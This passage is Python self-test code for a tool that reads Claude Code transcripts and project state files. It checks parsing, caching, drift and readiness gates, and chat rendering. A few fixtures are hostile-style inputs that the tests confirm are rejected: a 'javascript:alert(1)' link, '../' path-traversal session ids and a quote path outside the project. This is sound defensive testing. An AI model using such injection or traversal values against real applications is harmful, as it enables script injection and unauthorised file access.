    # -- frontmatter shapes that used to produce confident wrong answers -----

    # A sequence dash at column 0 is valid YAML; requiring indentation gave [].
    flat_seq = parse_frontmatter('---\nstatus: paused\nblockers:\n'
                                 '- "Me [M]: decide the merge order"\n'
                                 '- "Sam [A]: register the app"\n---\n')
    assert len(flat_seq["blockers"]) == 2, flat_seq["blockers"]
    assert len(waiting_on_me(flat_seq["blockers"])) == 1, flat_seq["blockers"]

    # A quoted scalar wrapped over lines kept its opening quote and lost the rest.
    wrapped = parse_frontmatter('---\nnext_action: "first half of the sentence\n'
                                '  and the second half"\nstatus: paused\n---\n')
    assert wrapped["next_action"] == "first half of the sentence and the second half", \
        repr(wrapped["next_action"])
    assert wrapped["status"] == "paused", wrapped["status"]

    # An indented '---' inside a block scalar is a rule, not the terminator.
    ruled = parse_frontmatter('---\nnext_action: |\n  do this\n  ---\n  then that\n'
                              'status: paused\n---\n')
    assert ruled["next_action"] == "do this\n---\nthen that", repr(ruled["next_action"])
    assert ruled["status"] == "paused", "an indented rule ended the frontmatter"

    # Non-list blockers must mean none, not one invented one.
    # The last two parse as valid JSON but are not lists, so they reach the
    # post-json branch rather than the null-ish shortcut - which is where
    # wrapping used to invent a blocker out of nothing.
    for raw in ("null", "~", "{}", "[]", "", '{"a": 1}', "5"):
        got = parse_frontmatter("---\nblockers: " + raw + "\nstatus: paused\n---\n")
        assert got["blockers"] == [], (raw, got["blockers"])
        assert got["status"] == "paused", raw
    assert parse_frontmatter('---\nblockers: ["a"]\n---\n')["blockers"] == ["a"]
    assert parse_frontmatter('---\nblockers: ["a", "", "b"]\n---\n')["blockers"] == ["a", "b"]

    # A BOM is invisible and used to void the entire parse.
    bom = os.path.join(root, "bom")
    os.makedirs(os.path.join(bom, ".claude"))
    with open(os.path.join(bom, STATE_FILE), "w", encoding="utf-8-sig") as fh:
        fh.write('---\nstatus: paused\nnext_action: "ship it"\n---\n')
    st, _ = read_state(bom)
    assert st and st.get("status") == "paused", "a BOM voided the frontmatter"

    # -- plain-doc parsing ---------------------------------------------------

    # "Resumed ..." is not the resume heading, and the FIRST match wins.
    doc = ("# State\n**Updated:** 2026-01-01\n\n## Resumed the OCR work yesterday\n"
           "historical note, not the plan\n\n## RESUME HERE\n"
           "the actual next step\n**Updated:** 2026-09-08\n")
    pl = parse_plain_state(doc)
    assert pl["next_action"].startswith("the actual next step"), pl["next_action"]
    assert pl["last_updated"] == "2026-09-08", pl["last_updated"]   # newest, not first

    # A '#' comment inside a fenced block is not a heading.
    fenced = ("## RESUME HERE\nrun this:\n```bash\n# install deps first\n"
              "py setup.py\n```\nthen deploy\n\n## Older\nignore me\n")
    pf = parse_plain_state(fenced)
    assert "then deploy" in pf["next_action"], pf["next_action"]
    assert "ignore me" not in pf["next_action"], pf["next_action"]

    # -- append-only log heading --------------------------------------------

    assert _last_heading(["## 2026-09-08 real newest", "```", "## 2026-01-01 template",
                          "```", "body"]) == "## 2026-09-08 real newest"
    assert _last_heading(["## 2026-01-01 ancient", "### 2026-09-08 newest"]) \
        == "### 2026-09-08 newest"

    # -- the tail window can cut the one record that mattered ----------------

    big = os.path.join(root, "big.jsonl")
    real = "REWRITE the extraction pipeline for arabic totals"
    real_line = rec(type="last-prompt", lastPrompt=real)
    cont_line = rec(type="last-prompt", lastPrompt="continue")
    head_line = rec(type="filler", pad="x" * 1000)
    # Place the window boundary INSIDE real_line: leave TAIL_BYTES minus half of
    # that line after it, so tailing drops exactly the record that matters and
    # keeps the "continue" that follows it.
    pad_len = TAIL_BYTES - len(real_line) // 2 - len(cont_line)
    assert pad_len > 0
    with open(big, "w", encoding="utf-8") as fh:
        fh.write(head_line)
        fh.write(real_line)
        fh.write(cont_line)
        fh.write("y" * (pad_len - 1) + "\n")
    size = os.path.getsize(big)
    boundary = size - TAIL_BYTES
    assert len(head_line) < boundary < len(head_line) + len(real_line), \
        "boundary at %d does not fall inside the record" % boundary
    assert size > TAIL_BYTES, "fixture is not big enough to be tailed"
    tailed = _prompts_in(big)
    assert real not in tailed, "fixture did not straddle the window; test is void"
    slug = os.path.join(root, "reg", "D--Big")
    os.makedirs(slug)
    shutil.move(big, os.path.join(slug, "big.jsonl"))
    prompts, sid, trivial = last_prompts(slug)
    assert prompts == [real], prompts        # escalated to a full read
    assert not trivial and sid == "big", (sid, trivial)

    # -- cwd resolution walks transcripts ------------------------------------

    proj = os.path.join(root, "Walk Me")
    os.makedirs(proj)
    older = os.path.join(slug, "older.jsonl")
    with open(older, "w", encoding="utf-8") as fh:
        fh.write(rec(type="attachment", cwd=proj, gitBranch="main"))
        fh.write(rec(type="last-prompt", lastPrompt="do the thing carefully"))
        fh.write("z" * 300 + "\n")
    newest = os.path.join(slug, "newest.jsonl")
    with open(newest, "w", encoding="utf-8") as fh:
        fh.write(rec(type="queue-operation"))     # no cwd anywhere
        fh.write("w" * 300 + "\n")
    os.utime(older, (1_000_000, 1_000_000))
    os.utime(newest, (3_000_000, 3_000_000))
    path, branch = resolve_project(transcripts(slug))
    assert path == proj and branch == "main", (path, branch)

    # -- same-second, same-length edits must not be cached -------------------

    # Prime the cache at .25s, then change the content to the same LENGTH and
    # stamp it .75s - the same whole second. A key built from int(st_mtime)
    # is byte-identical across those two states, so the read comes back stale.
    sp = os.path.join(bom, STATE_FILE)
    with open(sp, "w", encoding="utf-8") as fh:
        fh.write('---\nstatus: aaaaaa\n---\n')
    os.utime(sp, (1_700_000_000.25, 1_700_000_000.25))
    size_a = os.stat(sp).st_size
    assert read_state(bom)[0]["status"] == "aaaaaa"
    with open(sp, "w", encoding="utf-8") as fh:
        fh.write('---\nstatus: bbbbbb\n---\n')     # identical length
    os.utime(sp, (1_700_000_000.75, 1_700_000_000.75))
    assert os.stat(sp).st_size == size_a, "sizes differ, so the test proves nothing"
    assert read_state(bom)[0]["status"] == "bbbbbb", "cache keyed on whole seconds"

    # -- the scan must notice an append and a state rewrite ------------------

    live = os.path.join(root, "Live")
    os.makedirs(os.path.join(live, ".claude"))
    lslug = os.path.join(root, "reg2", "D--Live")
    os.makedirs(lslug)
    lj = os.path.join(lslug, "a.jsonl")
    with open(lj, "w", encoding="utf-8") as fh:
        fh.write(rec(type="attachment", cwd=live))
        fh.write(rec(type="last-prompt", lastPrompt="the ORIGINAL plan for step one"))
        fh.write("q" * 300 + "\n")
    with open(os.path.join(live, STATE_FILE), "w", encoding="utf-8") as fh:
        fh.write('---\nnext_action: "ORIGINAL next action"\n---\n')

    REGISTRY, EXTRA_ROOTS = os.path.join(root, "reg2"), []
    _cache.clear()
    _scan_cache.update(at=0.0, data=None)
    first = scan()[0]
    assert first["prompts"][-1].startswith("the ORIGINAL"), first["prompts"]

    with open(lj, "a", encoding="utf-8") as fh:
        fh.write(rec(type="last-prompt", lastPrompt="the NEW plan for step two"))
    with open(os.path.join(live, STATE_FILE), "w", encoding="utf-8") as fh:
        fh.write('---\nnext_action: "NEW next action"\n---\n')
    # Expire the TTL but KEEP the cached data: that is the state a live server
    # is in 30 seconds later. Clearing `data` too would let a never-expiring
    # cache pass this test by accident.
    _scan_cache["at"] = 0.0
    assert _scan_cache["data"] is not None, "test must leave stale data in place"
    again = scan()[0]
    assert again["prompts"][-1].startswith("the NEW"), \
        "an append to an existing transcript was invisible: " + str(again["prompts"])
    assert again["state"]["next_action"] == "NEW next action", again["state"]

    # -- ids stay unique even when _slugify collapses two paths --------------

    a = os.path.join(root, "a b")
    b = os.path.join(root, "a-b")
    os.makedirs(a)
    os.makedirs(b)
    assert _slugify(a) == _slugify(b), "fixture no longer collides; test is void"
    REGISTRY, EXTRA_ROOTS = os.path.join(root, "reg2"), [a, b]
    _scan_cache.update(at=0.0, data=None)
    ids = [r["id"] for r in scan()]
    assert len(ids) == len(set(ids)), ids

    # Two registry slugs pointing at ONE folder must yield one card.
    dup = os.path.join(root, "reg3")
    for name in ("D--One", "D--Two"):
        d = os.path.join(dup, name)
        os.makedirs(d)
        with open(os.path.join(d, "s.jsonl"), "w", encoding="utf-8") as fh:
            fh.write(rec(type="attachment", cwd=live))
            fh.write(rec(type="last-prompt", lastPrompt="same folder twice over"))
            fh.write("k" * 300 + "\n")
    REGISTRY, EXTRA_ROOTS = dup, []
    _scan_cache.update(at=0.0, data=None)
    paths = [os.path.normcase(r["path"]) for r in scan() if r["path"]]
    assert len(paths) == len(set(paths)), paths

    # -- launcher must never be a batch file ---------------------------------

    # Tested through the candidate list rather than through the real machine:
    # here Code.exe happens to exist and would be chosen either way, so an
    # assert about VSCODE itself could never fail.
    bat = os.path.join(root, "code.cmd")
    exe = os.path.join(root, "Code.exe")
    for f in (bat, exe):
        with open(f, "w", encoding="utf-8") as fh:
            fh.write("")
    assert _find_vscode([bat]) is None, "a batch launcher was accepted"
    assert _find_vscode([bat, exe]) == exe, _find_vscode([bat, exe])
    assert _find_vscode([os.path.join(root, "nope.exe")]) is None
    if VSCODE:
        assert not VSCODE.lower().endswith((".cmd", ".bat")), VSCODE

    shutil.rmtree(root, ignore_errors=True)


def selftest_gate():
    """Drift and the readiness gate, ported from Product Harness: a verdict is
    only valid against the inputs it saw, and a hard check never defaults to
    passing."""
    import tempfile
    global REGISTRY, EXTRA_ROOTS

    def rec(**kw):
        return json.dumps(kw, ensure_ascii=False) + "\n"

    T = 1_700_000_000.0

    # -- drift, as a pure function -------------------------------------------

    assert drift(None, [(T, "transcript")]) is None, "no state file cannot drift"
    assert drift(T, []) is None
    # Inside the grace window: the session that wrote the state keeps writing
    # its transcript for a few minutes afterwards. That is not drift.
    assert drift(T, [(T + DRIFT_GRACE - 1, "transcript")]) is None
    d = drift(T, [(T + 3 * 3600, "transcript"), (T + 5 * 3600, "commit"),
                  (None, "commit")])
    assert d and d["by"] == "commit" and d["behind_hours"] == 5.0, d   # newest wins

    # -- the gate, on hand-built records -------------------------------------

    def card(**state):
        blockers = state.pop("blockers", [])
        # Proof present by default, so each case isolates the check it names;
        # the proof check has its own cases in selftest_checkpoint().
        state.setdefault("proof", "53/53 passed")
        state.setdefault("for", "the finance team closing the month")
        state.setdefault("bet", "totals that match the ledger save a day of rework")
        return {"state": state, "blockers": blockers,
                "drift": state.pop("_drift", None) if state else None}

    none = gate({"state": None, "blockers": [], "drift": None})
    assert none["verdict"] == "fail", none
    assert [g["id"] for g in none["gaps"]] == ["has_state"], none["gaps"]

    good = gate(card(next_action="rerun the arabic totals against the ledger"))
    assert good == {"verdict": "pass", "gaps": [], "next": None}, good

    # Filler is not a next action - same stoplist as the prompt bubble.
    dull = gate(card(next_action="continue"))
    assert dull["verdict"] == "fail" and dull["gaps"][0]["id"] == "next_action", dull
    assert gate(card(next_action=None))["verdict"] == "fail", "missing next_action passed"

    stale = gate(card(next_action="rerun the arabic totals against the ledger",
                      _drift={"by": "transcript"}))
    assert stale["verdict"] == "fail" and stale["gaps"][0]["id"] == "fresh", stale

    # An unowned blocker is a SOFT gap: reported, never blocking. DONE entries
    # are not open, so they need no owner.
    soft = gate(card(next_action="rerun the arabic totals against the ledger",
                     blockers=["Me [M]: pick a merge order",
                               "THE HOST1 IS OFF THIS LAN.",
                               "DONE 2026-09-06: counts ran"]))
    assert soft["verdict"] == "pass", soft
    assert [g["id"] for g in soft["gaps"]] == ["blockers_owned"], soft["gaps"]
    assert gate(card(next_action="rerun the arabic totals against the ledger",
                     blockers=["DONE: all clear", "Sam [A]: register the app"])
                )["gaps"] == []

    # Hard gaps come before soft ones, so `next` is always the blocking question.
    both = gate(card(next_action="ok", blockers=["nobody owns this"]))
    assert [g["hard"] for g in both["gaps"]] == [True, False], both["gaps"]
    assert both["next"] == both["gaps"][0]["question"]

    # -- end to end: work after the last state write flags drift -------------

    root = tempfile.mkdtemp(prefix="library-gate-")
    proj = os.path.join(root, "Drifter")
    os.makedirs(os.path.join(proj, ".claude"))
    sp = os.path.join(proj, STATE_FILE)
    with open(sp, "w", encoding="utf-8") as fh:
        fh.write('---\nnext_action: "wire the export button to the ledger"\n'
                 'proof: "export test 4/4 passed"\n'
                 'for: "the accountant"\nbet: "one-click export beats copy-paste"\n---\n')
    slug = os.path.join(root, "reg", "D--Drifter")
    os.makedirs(slug)
    tj = os.path.join(slug, "t.jsonl")
    with open(tj, "w", encoding="utf-8") as fh:
        fh.write(rec(type="attachment", cwd=proj))
        fh.write(rec(type="last-prompt", lastPrompt="add the csv export path"))
        fh.write("q" * 300 + "\n")
    os.utime(sp, (T, T))
    os.utime(tj, (T + 4 * 3600, T + 4 * 3600))

    REGISTRY, EXTRA_ROOTS = os.path.join(root, "reg"), []
    _cache.clear()
    _scan_cache.update(at=0.0, data=None)
    got = scan(force=True)[0]
    assert got["drift"] and got["drift"]["by"] == "transcript", got["drift"]
    assert got["gate"]["verdict"] == "fail", got["gate"]
    assert got["gate"]["next"] == got["gate"]["gaps"][0]["question"]
    lt = light(got)
    assert lt["drift"] is True and lt["gate"] == "fail" and lt["gap_count"] == 1, lt
    assert lt["gate_next"], lt

    # Rewriting the state after the work clears it - the same way a fresh
    # grading clears a stale one in the Harness.
    os.utime(sp, (T + 5 * 3600, T + 5 * 3600))
    got = scan(force=True)[0]
    assert got["drift"] is None, got["drift"]
    assert got["gate"]["verdict"] == "pass", got["gate"]

    # A folder that no longer exists gets no verdict at all, not a fake fail.
    shutil.rmtree(proj)
    _scan_cache.update(at=0.0, data=None)
    gone = scan(force=True)[0]
    assert gone["gate"] is None and light(gone)["gate"] is None, gone["gate"]

    shutil.rmtree(root, ignore_errors=True)


def selftest_checkpoint():
    """The file /library-checkpoint writes is a contract. The fixture is the
    example from skills/library-checkpoint/SKILL.md verbatim, so the skill and the
    parser cannot drift apart without this failing."""
    import tempfile
    global REGISTRY, EXTRA_ROOTS

    skill = os.path.join(HERE, "skills", "library-checkpoint", "SKILL.md")
    example = read_text(skill).split("## Example", 1)[1].split("```")[1].strip("\n")

    root = tempfile.mkdtemp(prefix="library-checkpoint-")
    proj = os.path.join(root, "Checkpointed")
    os.makedirs(os.path.join(proj, ".claude"))
    with open(os.path.join(proj, STATE_FILE), "w", encoding="utf-8") as fh:
        fh.write(example + "\n\n## Notes\n")
    REGISTRY, EXTRA_ROOTS = os.path.join(root, "no-registry"), [proj]
    _cache.clear()
    _scan_cache.update(at=0.0, data=None)
    got = scan(force=True)[0]
    lt = light(got)

    assert lt["stage"] == "verify", lt["stage"]
    assert lt["proof"] == "py library.py --selftest -> selftest OK; commit 39be42f", lt["proof"]
    assert lt["status"] == "active" and lt["waiting_count"] == 1, lt
    assert lt["blocker_count"] == 2, lt
    assert got["state"]["stage"] == "verify", got["state"]
    # A paragraph in `stage:` must not become a badge, same rule as status.
    rambling = dict(got, state=dict(got["state"], stage="x" * 40))
    assert light(rambling)["stage"] is None, light(rambling)["stage"]

    # The skill's example is a complete checkpoint: nothing left to ask.
    assert got["gate"] == {"verdict": "pass", "gaps": [], "next": None}, got["gate"]

    # Proof is Harness's "a pass must cite evidence", kept SOFT so state files
    # written before the skill existed still pass. A placeholder is not proof.
    base = {"next_action": "rerun the arabic totals against the ledger",
            "for": "the finance team", "bet": "matching totals save a day of rework"}
    for proof in (None, "", "none yet - a green probe run would prove it"):
        g = gate({"state": dict(base, proof=proof), "blockers": [], "drift": None})
        assert g["verdict"] == "pass", (proof, g)
        assert [x["id"] for x in g["gaps"]] == ["proof"], (proof, g["gaps"])
        assert g["gaps"][0]["hard"] is False
    assert gate({"state": dict(base, proof="53/53 passed"), "blockers": [],
                 "drift": None})["gaps"] == []

    # Checked proof, Harness's citation check: a commit the proof cites must
    # exist in that repo, not just be quoted. Soft, like the proof check.
    cited = gate({"state": dict(base, proof="commit 0badc0de"), "blockers": [],
                  "drift": None, "proof_unknown": ["0badc0de"]})
    assert cited["verdict"] == "pass", cited
    assert [(x["id"], x["hard"]) for x in cited["gaps"]] == [("proof_commit", False)], cited
    # No repo to ask (like the skill example above): unverified, not disproven.
    assert unknown_commits(proj, "commit 0badc0de") == []

    git = shutil.which("git")
    if git:
        repo = os.path.join(root, "Cited")
        os.makedirs(os.path.join(repo, ".claude"))

        def g(*args):
            return subprocess.run(
                [git, "-C", repo, "-c", "user.name=t", "-c", "user.email=t@t",
                 "-c", "commit.gpgsign=false"] + list(args),
                capture_output=True, text=True, check=True).stdout.strip()

        g("init", "-q")
        g("commit", "-q", "--allow-empty", "-m", "real work")
        real = g("rev-parse", "--short", "HEAD")
        assert unknown_commits(repo, f"6/6 passed; commit {real}") == []
        assert unknown_commits(repo, "6/6 passed; commit 0badc0de") == ["0badc0de"]
        # A blob or tree hash is not a commit, even though cat-file -e finds it.
        tree = g("rev-parse", "--short", "HEAD^{tree}")
        assert unknown_commits(repo, f"commit {tree}") == [tree]

        # End to end: the scan asks the project's own repo.
        def scan_with(proof):
            with open(os.path.join(repo, STATE_FILE), "w", encoding="utf-8") as fh:
                fh.write(f'---\nnext_action: "{base["next_action"]}"\n'
                         f'proof: "{proof}"\nfor: "{base["for"]}"\nbet: "{base["bet"]}"\n---\n')
            global EXTRA_ROOTS
            EXTRA_ROOTS = [repo]
            _cache.clear()
            _scan_cache.update(at=0.0, data=None)
            return scan(force=True)[0]["gate"]

        fake = scan_with("6/6 passed; commit 0badc0de")
        assert [x["id"] for x in fake["gaps"]] == ["proof_commit"], fake
        assert scan_with(f"6/6 passed; commit {real}")["gaps"] == []

    # The catalog card: who it is for and why it mattered, so a building found
    # months later explains itself. Soft: old state files still pass.
    for card in ({}, {"for": "the finance team"}, {"bet": "saves a day"},
                 {"for": "the finance team", "bet": "none yet - ask them"}):
        st = dict(base, proof="53/53 passed"); st.pop("for"); st.pop("bet"); st.update(card)
        g = gate({"state": st, "blockers": [], "drift": None})
        assert g["verdict"] == "pass" and [(x["id"], x["hard"]) for x in g["gaps"]] == [("card", False)], (card, g)
    lt = light(dict(got, state=dict(got["state"], **{"for": "me", "bet": "why"})))
    assert lt["for"] == "me" and lt["bet"] == "why", lt

    # Quoted evidence, Harness's verbatim-citation rule: "file: 'words'" must
    # appear in that file inside the project. Whitespace is normalised so a
    # wrapped line still matches; anything else is a misquote.
    qp = os.path.join(root, "Quoted")
    os.makedirs(os.path.join(qp, "docs"))
    with open(os.path.join(qp, "docs", "interviews.md"), "w", encoding="utf-8") as fh:
        fh.write("Pat: I lose track of\nmy prototypes every single month.\n")
    with open(os.path.join(root, "outside.md"), "w", encoding="utf-8") as fh:
        fh.write("a quote that lives outside the project folder\n")
    assert unverified_quotes(qp, "docs/interviews.md: 'lose track of my prototypes every single month'") == []
    assert unverified_quotes(qp, r"docs\interviews.md: 'I lose track of my prototypes'") == []
    assert unverified_quotes(qp, "docs/interviews.md: 'I never lose my prototypes'") == ["docs/interviews.md"]
    assert unverified_quotes(qp, "docs/missing.md: 'any words at all here'") == ["docs/missing.md"]
    assert unverified_quotes(qp, "../outside.md: 'a quote that lives outside'") == ["../outside.md"]
    assert unverified_quotes(qp, "no quotes here", None, "") == []
    # Checked in every card field, not only proof.
    assert unverified_quotes(qp, None, None, "docs/interviews.md: 'every single week'") == ["docs/interviews.md"]
    q = gate({"state": dict(base, proof="x"), "blockers": [], "drift": None,
              "proof_unquoted": ["docs/interviews.md"]})
    assert q["verdict"] == "pass" and [(x["id"], x["hard"]) for x in q["gaps"]] == [("proof_quote", False)], q

    # End to end: the scan reads the quoted file.
    os.makedirs(os.path.join(qp, ".claude"))
    def scan_quoted(bet):
        with open(os.path.join(qp, STATE_FILE), "w", encoding="utf-8") as fh:
            fh.write(f'---\nnext_action: "{base["next_action"]}"\nproof: "53/53 passed"\n'
                     f'for: "Pat"\nbet: "{bet}"\n---\n')
        global EXTRA_ROOTS
        EXTRA_ROOTS = [qp]
        _cache.clear()
        _scan_cache.update(at=0.0, data=None)
        return scan(force=True)[0]["gate"]
    assert scan_quoted("docs/interviews.md: 'my prototypes every single month'")["gaps"] == []
    assert [x["id"] for x in scan_quoted("docs/interviews.md: 'my prototypes every day'")["gaps"]] == ["proof_quote"]

    shutil.rmtree(root, ignore_errors=True)


def selftest_truth():
    """The truth boundary never calls a claim checked unless the scan checked
    it. Each case is a way a naive boundary over-claims."""
    import tempfile
    base = {"next_action": "rerun the totals against the ledger", "status": "paused"}
    repo = {"branch": "main", "subject": "x", "committed": "2026-01-01T00:00:00", "dirty": 0}

    def t(state=None, **rec):
        return truth(dict({"state": dict(base, **(state or {})), "blockers": [], "drift": None}, **rec))

    assert truth({"state": None}) is None
    plain = t({"proof": "53/53 passed"})
    assert plain == {"checked": [{"what": "state rewritten after the latest work", "ok": True}],
                     "written": ["next action", "status", "proof"]}, plain
    # A placeholder is nothing written down, not a claim.
    assert t({"proof": "none yet - run it"})["written"] == ["next action", "status"]
    # Stale state: the freshness check ran and failed.
    assert t(drift={"by": "commit"})["checked"][0]["ok"] is False
    # Cited commit, no repo to ask: unknown_commits said nothing, so nothing was checked.
    nogit = t({"proof": "6/6 passed; commit abc1234"})
    assert len(nogit["checked"]) == 1 and "proof" in nogit["written"], nogit
    # A branch hint without git_info is not a repo either.
    hint = t({"proof": "commit abc1234"}, git={"branch": "main", "committed": None})
    assert "proof" in hint["written"], hint
    ok = t({"proof": "6/6 passed; commit abc1234"}, git=repo)
    assert ok["checked"][1:] == [{"what": "commit abc1234 is in the repo", "ok": True}], ok
    assert "proof" not in ok["written"], ok
    bad = t({"proof": "commit 0badc0de"}, git=repo, proof_unknown=["0badc0de"])
    assert bad["checked"][1:] == [{"what": "commit 0badc0de is in the repo", "ok": False}], bad
    # Git disproved it even with no commits to read a date from.
    assert t({"proof": "commit 0badc0de"}, proof_unknown=["0badc0de"])["checked"][1]["ok"] is False
    # A quote is checked in any card field; a misquote is checked and false.
    q = t({"bet": "NOTES.md: 'two hours a day by hand'"}, proof_unquoted=["NOTES.md"])
    assert q["checked"][1:] == [{"what": "NOTES.md has the quoted words", "ok": False}], q
    assert "why it matters" not in q["written"], q
    # Open blockers are claims too; closed ones are not.
    assert t(blockers=["Me [M]: sign the form", "DONE: shipped"])["written"][-1] == "1 blocker"

    # End to end: _build fills it and light() carries it to the report.
    root = tempfile.mkdtemp(prefix="library-truth-")
    os.makedirs(os.path.join(root, ".claude"))
    with open(os.path.join(root, STATE_FILE), "w", encoding="utf-8") as fh:
        fh.write('---\nnext_action: "rerun the totals against the ledger"\nproof: "commit abc1234"\n---\n')
    rec = _build(root, "truth", "extra")
    assert rec["truth"]["written"] == ["next action", "proof"], rec["truth"]
    assert light(rec)["truth"] == rec["truth"]
    shutil.rmtree(root, ignore_errors=True)


def selftest_snapshot():
    """The one write this app makes: only when something changed, and only in
    its own folder. Each case is a way it could quietly go wrong."""
    import tempfile
    global DATA_DIR
    saved, root = DATA_DIR, tempfile.mkdtemp(prefix="library-snap-")
    proj = os.path.join(root, "Some Project")
    os.makedirs(proj)

    def rec(**kw):
        r = {k: None for k in LIGHT}
        r.update(id="D--Some-Project", name="Some Project", path=proj, sessions=1, bytes=10, prompts=[],
                 prompt_trivial=False, state={"stage": "build", "next_action": "ship it"}, blockers=[],
                 waiting=[], git=None, gate={"verdict": "pass", "gaps": [], "next": None}, drift=None,
                 truth=None, chapters=[], origin=None, prs=[])
        r.update(kw)
        return r

    DATA_DIR = os.path.join(root, "data")
    a = rec()
    assert history(a) == [] and not os.path.exists(snap_db())     # reading never creates the database
    assert snapshot([a]) == 1
    assert snapshot([a]) == 0                                      # nothing changed, nothing written
    # A live chat moves bytes, prompts and the activity time on every message:
    # alone, that is not a change, or an open session would write a row per scan.
    assert snapshot([rec(bytes=99, prompts=["typing"], last_activity="2026-10-19T10:00:00")]) == 0
    assert snapshot([rec(gate={"verdict": "fail", "gaps": [], "next": "why"})]) == 1
    # Keyed by the folder: a registry id that changes (a dedupe suffix) keeps the history.
    h = history(rec(id="D--Some-Project-2"))
    assert [r["record"]["gate"] for r in h] == ["fail", "pass"], h
    assert h[0]["record"]["name"] == "Some Project" and h[0]["at"], h[0]
    # Never inside anything it only reads, whatever LIBRARY_DATA_DIR says.
    for bad in (proj, os.path.join(proj, "history"), REGISTRY, PLANS_DIR):
        DATA_DIR = bad
        try:
            snapshot([a])
            raise AssertionError("wrote history inside " + bad)
        except ValueError:
            pass
    assert not os.path.exists(os.path.join(proj, "history")), "made a folder inside the project"
    DATA_DIR = saved
    shutil.rmtree(root, ignore_errors=True)


def selftest_chat():
    """Past chats read back as what was said. Each case is a trap: plumbing
    records that look like prompts, tool noise, and a session id that tries
    to leave the project's folder."""
    import tempfile
    global REGISTRY
    saved, root = REGISTRY, tempfile.mkdtemp(prefix="library-chat-")
    REGISTRY = root
    slug = "E--sample-proj"
    os.makedirs(os.path.join(root, slug))
    sid = "11111111-2222-3333-4444-555555555555"
    fp = os.path.join(root, slug, sid + ".jsonl")
    recs = [
        {"type": "user", "message": {"content": "<command-name>/clear</command-name>"}},
        {"type": "user", "isMeta": True, "message": {"content": "meta, never shown"}},
        {"type": "user", "message": {"content": "add a dark mode"}, "timestamp": "2026-10-01T10:00:00Z"},
        {"type": "assistant", "message": {"content": [{"type": "tool_use", "name": "Read"}]}},
        {"type": "user", "message": {"content": [{"type": "tool_result", "content": "file body"}]}},
        {"type": "assistant", "message": {"content": [{"type": "tool_use", "name": "Edit"},
                                                      {"type": "tool_use", "name": "Read"}]}},
        {"type": "assistant", "isSidechain": True, "message": {"content": [{"type": "text", "text": "sub-agent"}]}},
        {"type": "assistant", "message": {"content": [{"type": "text", "text": "Done: dark mode is on."}]}},
        {"type": "user", "message": {"content": "x" * (CHAT_CHARS + 50)}},
        {"type": "last-prompt", "lastPrompt": "add a dark mode"},
    ]
    with open(fp, "w", encoding="utf-8") as fh:
        fh.write("".join(json.dumps(r) + "\n" for r in recs) + "{broken json\n")
    _cache.clear()
    got = chat(fp)
    roles = [(m["role"], m["text"][:30]) for m in got["messages"]]
    assert roles == [("you", "add a dark mode"), ("tool", "used Read, Edit"),
                     ("claude", "Done: dark mode is on."), ("you", "x" * 30)], roles
    assert got["messages"][0]["at"] == "2026-10-01T10:00:00Z" and got["cut"] == 0, got
    assert got["messages"][-1]["text"].endswith(" [...]"), "a long message was not cut"
    assert "tools" not in got["messages"][1], got["messages"][1]
    rec = {"source": "registry", "slug": slug}
    assert chat_file(rec, sid) == fp
    for bad in ("../" + slug + "/" + sid, "", "nope", sid + ".jsonl"):
        assert chat_file(rec, bad) is None, bad
    assert chat_file({"source": "extra", "slug": slug}, sid) is None
    REGISTRY = saved
    _cache.clear()
    shutil.rmtree(root, ignore_errors=True)


def selftest_story():
    """How it started, Claude's chapters, what shipped - all read straight from
    the transcripts, no model. Each case is a trap a naive reader falls into."""
    import tempfile
    global REGISTRY, EXTRA_ROOTS

    def rec(**kw):
        return json.dumps(kw, ensure_ascii=False) + "\n"

    T = 1_700_000_000.0
    root = tempfile.mkdtemp(prefix="library-story-")
    proj = os.path.join(root, "Habits")
    os.makedirs(proj)
    slug = os.path.join(root, "reg", "D--Habits")
    os.makedirs(slug)

    def session(name, age, *records):
        fp = os.path.join(slug, name + ".jsonl")
        with open(fp, "w", encoding="utf-8") as fh:
            fh.write(rec(type="attachment", cwd=proj, sessionId=name))
            fh.write("".join(records))
            fh.write("q" * 300 + "\n")          # past MIN_JSONL_BYTES
        os.utime(fp, (T + age, T + age))
        return fp

    # Oldest session: filler first, then the real ask. Claude titled it, then
    # the user renamed it - the user's own title wins.
    session("s1", 0,
            rec(type="last-prompt", lastPrompt="continue"),
            rec(type="last-prompt", lastPrompt="build a habit tracker cli with streaks"),
            rec(type="ai-title", aiTitle="Build habit tracker CLI"),
            rec(type="custom-title", customTitle="Habit tracker v0"))
    # Middle: Claude retitled the session as it went - the LAST title is current.
    # The same PR is linked twice; it shipped once.
    pr3 = "https://github.com/example/habits/pull/3"
    session("s2", 3600,
            rec(type="last-prompt", lastPrompt="why did my streak reset at midnight"),
            rec(type="ai-title", aiTitle="Investigate streak"),
            rec(type="ai-title", aiTitle="Fix streak reset at midnight"),
            rec(type="pr-link", prNumber=3, prRepository="example/habits", prUrl=pr3,
                timestamp="2023-11-14T23:30:00Z"),
            rec(type="pr-link", prNumber=3, prRepository="example/habits", prUrl=pr3,
                timestamp="2023-11-14T23:31:00Z"))
    # Newest: no title. A PR link that is not https is never shown.
    session("s3", 7200,
            rec(type="last-prompt", lastPrompt="add a weekly summary view"),
            rec(type="pr-link", prNumber=9, prRepository="x/y", prUrl="javascript:alert(1)",
                timestamp="2023-11-15T00:00:00Z"),
            rec(type="pr-link", prNumber=4, prRepository="example/habits",
                prUrl="https://github.com/example/habits/pull/4", timestamp="2023-11-15T00:10:00Z"))

    REGISTRY, EXTRA_ROOTS = os.path.join(root, "reg"), []
    _cache.clear()
    _scan_cache.update(at=0.0, data=None)
    got = scan(force=True)[0]

    # How it started: the first REAL prompt of the OLDEST session, not filler,
    # and not the newest session (which is what "last prompt" already shows).
    assert got["origin"] == {"prompt": "build a habit tracker cli with streaks",
                             "at": _iso(T)}, got["origin"]
    assert got["prompts"][-1] == "add a weekly summary view", got["prompts"]
    # Claude's chapters, oldest first; untitled sessions are skipped.
    assert [c["title"] for c in got["chapters"]] == ["Habit tracker v0", "Fix streak reset at midnight"], got["chapters"]
    assert got["chapters"][1]["at"] == _iso(T + 3600), got["chapters"]
    # What shipped: de-duplicated, https only, oldest first.
    assert [p["number"] for p in got["prs"]] == [3, 4], got["prs"]
    assert all(p["url"].startswith("https://") for p in got["prs"]), got["prs"]
    lt = light(got)
    assert lt["origin_prompt"] == "build a habit tracker cli with streaks", lt
    assert lt["chapter_count"] == 2 and lt["latest_chapter"] == "Fix streak reset at midnight", lt
    assert lt["pr_count"] == 2, lt

    # A project whose sessions never said anything substantive has no origin,
    # rather than a "continue" presented as the reason it exists.
    shutil.rmtree(slug)
    os.makedirs(slug)
